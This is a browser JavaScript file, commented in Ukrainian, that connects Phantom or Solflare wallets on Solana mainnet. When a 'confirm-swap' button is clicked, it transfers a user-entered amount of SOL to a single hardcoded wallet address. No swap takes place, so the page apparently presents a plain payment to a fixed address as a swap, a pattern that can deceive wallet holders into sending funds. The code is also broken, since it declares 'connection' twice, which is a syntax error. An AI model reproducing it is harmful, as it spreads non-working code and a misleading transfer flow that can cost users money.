import { Connection, PublicKey, Transaction, SystemProgram } from "https://esm.sh/@solana/web3.js";
import { Buffer } from "https://esm.sh/buffer/";

window.Buffer = Buffer; // Робимо buffer доступним у браузері

const connection = new Connection("https://api.mainnet-beta.solana.com");
console.log("Solana Web3.js підключено!");


const SOLANA_NETWORK = "https://api.mainnet-beta.solana.com";
const connection = new Connection(SOLANA_NETWORK);
const recipientWallet = "4ofLfgCmaJYC233vTGv78WFD4AfezzcMiViu26dF3cVU";

let wallet = null;
let provider = null;

console.log("Solana Web3.js підключено!");

// Підключення Phantom
async function connectPhantom() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const response = await window.solana.connect();
            wallet = response.publicKey.toString();
            provider = window.solana;
            document.getElementById("walletInfo").innerText = `Підключено: ${wallet}`;
        } catch (error) {
            console.error("Помилка підключення Phantom:", error);
        }
    } else {
        alert("Установіть Phantom Wallet");
    }
}

// Підключення Solflare
async function connectSolflare() {
    if (window.solflare && window.solflare.isSolflare) {
        try {
            await window.solflare.connect();
            wallet = window.solflare.publicKey.toString();
            provider = window.solflare;
            document.getElementById("walletInfo").innerText = `Підключено: ${wallet}`;
        } catch (error) {
            console.error("Помилка підключення Solflare:", error);
        }
    } else {
        alert("Установіть Solflare Wallet");
    }
}

// Функція для створення та відправки транзакції
async function sendTransaction() {
    if (!wallet || !provider) {
        alert("Спочатку підключіть гаманець");
        return;
    }
    
    const amount = parseFloat(document.getElementById("amount").value);
    if (!amount || amount <= 0) {
        alert("Введіть коректну суму");
        return;
    }
    
    const lamports = amount * 1e9; // SOL в lamports
    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: new PublicKey(wallet),
            toPubkey: new PublicKey(recipientWallet),
            lamports: lamports,
        })
    );

    try {
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = new PublicKey(wallet);

        const signedTransaction = await provider.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());

        alert(`Транзакція надіслана! ID: ${txid}`);
        console.log(`Transaction ID: https://solscan.io/tx/${txid}`);
    } catch (error) {
        console.error("Помилка відправки транзакції:", error);
    }
}

// Додаємо обробники подій
document.getElementById("connectPhantom").addEventListener("click", connectPhantom);
document.getElementById("connectSolflare").addEventListener("click", connectSolflare);
document.getElementById("confirm-swap").addEventListener("click", sendTransaction);
